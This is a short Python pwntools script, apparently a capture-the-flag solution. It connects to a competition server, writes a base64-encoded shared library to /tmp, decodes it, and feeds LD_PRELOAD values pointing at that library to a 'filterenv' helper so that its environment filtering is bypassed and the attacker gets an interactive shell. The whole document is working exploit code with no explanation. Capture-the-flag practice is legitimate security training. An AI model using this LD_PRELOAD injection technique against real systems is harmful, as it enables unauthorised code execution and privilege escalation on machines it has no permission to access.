from pwn import *
import base64

load = base64.b64encode(open("load", "rb").read())
p = remote('env.ctfcompetition.com', 1337)
p.sendline('cd /tmp/')
p.sendline("echo '" + load + "' > load.txt")
p.sendline("base64 -d load.txt > load.so")
p.sendline("/home/adminimum/filterenv")
p.sendline("LD_PRELOAD=/tmp")
p.sendline("LD_PRELOAD=/tmp/load.so")
p.sendline()
p.interactive()